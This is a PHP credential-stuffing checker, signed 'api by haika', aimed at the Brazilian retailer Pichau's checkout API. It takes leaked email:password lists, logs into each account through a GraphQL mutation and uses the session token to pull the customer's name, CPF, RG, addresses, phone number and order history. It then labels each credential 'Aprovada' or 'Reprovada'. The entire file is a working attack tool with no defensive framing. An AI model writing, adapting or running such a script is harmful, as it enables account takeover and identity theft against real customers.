<?php


// api by haika //

error_reporting(0);

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}


$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$senha = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];

if(file_exists("haika.txt")){
    unlink("haika.txt");
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.pichau.com.br/api/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/haika.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/haika.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/json',
'origin: https://www.pichau.com.br',
'referer: https://www.pichau.com.br/account',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"generateCustomerToken","variables":{"username":"'.$email.'","password":"'.$senha.'","token":"3d640ddc3645d335d5b6b90196d3d18f","log":"log---13---log"},"query":"mutation generateCustomerToken($username: String!, $password: String!) {\n  generateCustomerToken(email: $username, password: $password) {\n    token\n    __typename\n  }\n}\n"}');
$retorno = curl_exec($ch);

$retorno = getStr($retorno, '"message":"','",');
$token = getStr($retorno, '"token":"','",');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.pichau.com.br/api/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/haika.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/haika.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'authorization: Bearer '.$token.'',
'content-type: application/json',
'origin: https://www.pichau.com.br',
'referer: https://www.pichau.com.br/account',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":null,"variables":{},"query":"{\n  customer {\n    firstname\n    lastname\n    suffix\n    email\n    default_billing\n    default_shipping\n    taxvat\n    rg\n    ie\n    tipopessoa\n    nomefantasia\n    empresa\n    addresses {\n      id\n      firstname\n      lastname\n      street\n      city\n      region {\n        region_code\n        region\n        __typename\n      }\n      postcode\n      country_code\n      telephone\n      __typename\n    }\n    orders(pageSize: 10) {\n      items {\n        id\n        increment_id\n        order_date\n        order_number\n        created_at\n        total {\n          grand_total {\n            value\n            currency\n            __typename\n          }\n          __typename\n        }\n        status\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}');
$checkout = curl_exec($ch);
$nome = getStr($checkout, '"firstname":"','",');
$nome2 = getStr($checkout, '"lastname":"','",');
$cpf = getStr($checkout, '"taxvat":"','",');
$rg = getStr($checkout, '"rg":"','",');
$telephone = getStr($checkout, '"telephone":"','",');

if(strpos($retorno, '__typename')){
    echo "<br><font color = 'lime'>Aprovada</font> $email:$senha | Nome: $nome $nome2 | CPF: $cpf | RG: $rg | Telefone: $telephone | Api By Haika";
}
else{
    echo "<br><font color = 'red'>Reprovada</font> $email:$senha | Retorno: $retorno  | Api By Haika";
}

?>